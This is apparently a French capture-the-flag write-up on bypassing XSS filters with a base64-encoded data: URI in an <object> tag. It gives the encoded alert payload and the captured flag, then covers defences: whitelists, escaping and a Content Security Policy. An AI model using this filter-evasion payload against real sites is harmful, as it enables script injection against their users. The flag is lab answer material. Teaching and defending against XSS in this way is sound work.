# Nom de la faille
ReflectedBase64 

## Définition
On peut contourner certains filtres XSS en utilisant une URI de type `data:` encodée en **base64**.

## Détection et Exploitation

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></object>
```

Cette charge utile base64 représente :

```html
<script>alert('XSS')</script>
```

Format général de l’URI `data:`

```
data:[<type MIME>][;base64],<contenu encodé>
```

Exemple avec HTML encodé :

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
```

## Flag obtenu

```
928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
```

---

## Comment l’éviter

1. **Utiliser une whitelist d’URL sûres**

Limiter les sources autorisées (par exemple pour `src`, `data`, `href`) uniquement à des domaines ou chemins connus et vérifiés.

2. **Utiliser des iframes pour isoler du contenu externe**

Ne jamais intégrer directement des données potentiellement malveillantes via `<object>` ou `src=data:`. Préférer l'encapsulation dans une iframe sécurisée.

3. **Échapper les entrées utilisateur**

Toutes les données venant des utilisateurs doivent être encodées pour ne pas être interprétées comme du code (HTML, JS).

4. **Mettre en place une Content Security Policy (CSP)**

Empêcher l’exécution de scripts non autorisés, dont les `data:` URIs :

```http
Content-Security-Policy: default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'self';
```

Cela désactive les sources non approuvées, y compris les URIs de type `data:` pour les balises `<object>`, `<iframe>`, etc.

## Notes complémentaires

- Les balises `<object>` et `<iframe>` sont vulnérables si elles peuvent charger des données dynamiques non filtrées.
- Les filtres XSS classiques peuvent être contournés par des techniques comme le base64 ou l’utilisation de schémas URI alternatifs (`data:`, `javascript:`, etc.).

## Ressources

- [Bypassing XSS Filters using Data URIs (Cubalo)](https://cubalo.github.io/blog/2014/01/04/bypassing-xss-filters-using-data-uris/)
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [MDN – Content Security Policy (CSP)](https://developer.mozilla.org/fr/docs/Web/HTTP/Guides/CSP)
